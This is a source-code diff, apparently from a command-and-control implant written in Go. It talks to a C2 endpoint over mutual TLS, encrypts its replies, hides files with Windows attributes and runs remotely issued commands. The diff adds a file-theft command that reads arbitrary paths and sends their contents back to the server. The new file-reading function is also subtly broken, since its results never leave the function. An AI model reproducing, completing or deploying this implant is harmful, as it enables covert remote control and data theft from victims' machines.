@@ -36,12 +36,10 @@ var (
 	X1              string
 	X2              string
 	InitPFile       string
-	CmdMap          = make(map[int]func(*models.KarResponseObjectCmd, ...models.MultiType) error)
 )
 
 func main() {
 	// Assign known commands to command function map
-	CmdMap[1] = ex.Do
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
 	waitSecondsInt, _ := strconv.Atoi(InitWaitSeconds)
@@ -201,34 +199,55 @@ func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*mod
 
 func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey string, mTLSClient *http.Client) {
 	responseObject := &models.KarResponseObjectCmd{}
-	cmdlet, args := cmdObject.Cmd, cmdObject.Args
-	f, ok := CmdMap[cmdlet]
+	filesObject := []models.KarObjectFile{}
+	var respObjectBytes []byte
+	objType := 1
 	var err error
-	if !ok {
-		responseObject.Code = 1
-	} else {
-		err = f(responseObject, args...)
+	cmdlet, args := cmdObject.Cmd, cmdObject.Args
+	switch cmdlet {
+	case 1:
+		err := ex.Do(responseObject, args...)
 		if err != nil {
 			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
+		}
+	case 3:
+		objType = 3
+		err := getFiles(filesObject, args...)
+		if err != nil {
+			objType = 1
+			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
 		}
 	}
-	respObjectBytes, err := json.Marshal(responseObject)
-	if err == nil {
-		if !broadcast {
-			respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
-			if err != nil {
-				log.Error("")
-				return
-			}
+	if objType == 1 {
+		respObjectBytes, err = json.Marshal(responseObject)
+		if err != nil {
+			return
 		}
-		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-			Type:   1, // data type 1 is a command
-			CmdID:  cmdID,
-			Object: respObjectBytes,
-		})
-	} else {
-		log.Error(err)
+	} else if objType == 3 {
+		respObjectBytes, err = json.Marshal(filesObject)
+		if err != nil {
+			return
+		}
 	}
+	if !broadcast {
+		respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
+		if err != nil {
+			log.Error("")
+			return
+		}
+	}
+	retUUID := UUID
+	if broadcast {
+		retUUID = ""
+	}
+	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+		Type:   objType, // data type 1 is a command
+		UUID:   retUUID,
+		CmdID:  cmdID,
+		Object: respObjectBytes,
+	})
 }
 
 // generic enough to be called anytime
@@ -260,6 +279,23 @@ func HideF(filename string) error {
 	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
 	if err != nil {
 		return err
+	}
+	return nil
+}
+
+func getFiles(files []models.KarObjectFile, args ...models.MultiType) error {
+	if len(args) == 0 {
+		return fmt.Errorf("")
+	}
+	for _, path := range args {
+		bytes, err := os.ReadFile(path.StrValue)
+		if err != nil {
+			return err
+		}
+		files = append(files, models.KarObjectFile{
+			FileBytes: bytes,
+			FileName:  path.StrValue,
+		})
 	}
 	return nil
 }
